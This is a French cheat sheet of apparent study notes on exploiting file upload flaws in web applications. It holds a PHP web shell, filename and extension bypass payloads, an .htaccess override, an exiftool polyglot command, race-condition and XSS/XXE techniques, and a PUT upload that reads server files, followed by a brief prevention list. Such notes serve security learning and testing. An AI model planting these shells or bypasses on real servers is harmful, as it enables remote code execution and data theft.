# File upload

## Les bases

### shell.php
```php
<?php system($_REQUEST['cmd']); ?>
```

### Utilisation après upload
```html
GET shell.php?cmd= HTTP/2
```

## Bypass

### Content-Type restriction 
```html
Content-Type: application/...
Content-Type: image/png
```

### User-accessible directories
```html
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Disposition: form-data; name="image"; filename="../shell.php"
Content-Disposition: form-data; name="image"; filename="..%2fshell.php"
```

### Overriding the server configuration

#### Upload .htaccess
```txt
AddType application/x-httpd-php .l33t
```

#### Puis
```html
Content-Disposition: form-data; name="image"; filename="shell.l33t"
```

### Obfuscating file extensions
```html
Content-Disposition: form-data; name="image"; filename="shell.php%00.png"
Content-Disposition: form-data; name="image"; filename="shell.php.jpg"
Content-Disposition: form-data; name="image"; filename="shell.php."
Content-Disposition: form-data; name="image"; filename="shell%2Ephp"
```

### Flawed validation of the file's contents

#### Exiftool

* https://exiftool.org/
* On met un fichier image.png dans notre dossier exiftool
* On tape la commande 
```cmd
.\exiftool.exe -Comment='<?php system($_REQUEST["cmd"]); ?>' image.png -o polyglot.php
```
* On upload polyglot.php

### Race conditions

Certains sites uploadent le fichier directement sur le filesystem, puis le suppriment s'il échoue à la validation (typique des sites qui délèguent le check à un antivirus). Pendant les quelques millisecondes où le fichier existe, on peut l'exécuter.

Pas de recette universelle : c'est du cas par cas, il faut souvent leaker le code source pour confirmer la faille.
C'est une faille subtile, difficile à détecter en blackbox.
Principe général :

* Uploader le shell.
* En parallèle, spammer des requêtes GET vers son chemin pour toucher la fenêtre où il existe encore.
* Utiliser Burp Intruder (ou Turbo Intruder pour le timing serré) : un thread qui upload en boucle, un thread qui requête en boucle.

### Race conditions - URL

Quand l'upload se fait en fournissant une URL, le serveur télécharge le fichier dans un répertoire temporaire avant de valider. Si le nom de ce répertoire est aléatoire, en théorie impossible à exploiter, sauf si l'aléatoire est faible.

* Nom généré par `uniqid()` → basé sur le timestamp, donc brute-forçable.
* Pour élargir la fenêtre de brute-force : allonger le temps de traitement en uploadant un gros fichier. Payload au début, puis beaucoup d'octets de padding arbitraires à la suite (traitement par chunks).

## Exploitation sans RCE

Même sans exécuter de script côté serveur, un upload non sécurisé reste exploitable.

### Scripts client-side (Stored XSS)

Si on peut uploader du HTML ou du SVG, on y met des `<script>` → XSS stocké quand un autre utilisateur affiche le fichier.

* Marche seulement si le fichier est servi depuis la **même origine** que celle où on l'upload (same-origin policy).
* SVG utile car souvent accepté comme "image" tout en pouvant contenir du JS.

### Parsing de formats de fichiers

En dernier recours : exploiter des failles propres au parsing d'un format.

* Fichiers XML-based (`.docx`, `.xlsx`, `.svg`...) → vecteur possible d'injection **XXE**.

## Upload via PUT

```html
PUT /images/shell.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## Prévention

* Whitelist d'extensions (pas blacklist).
* Filtrer les séquences de traversal (`../`) dans le nom.
* Renommer les fichiers uploadés (éviter les collisions/overwrite).
* Ne pas écrire sur le filesystem permanent avant validation complète.
* Utiliser un framework établi plutôt qu'une validation maison.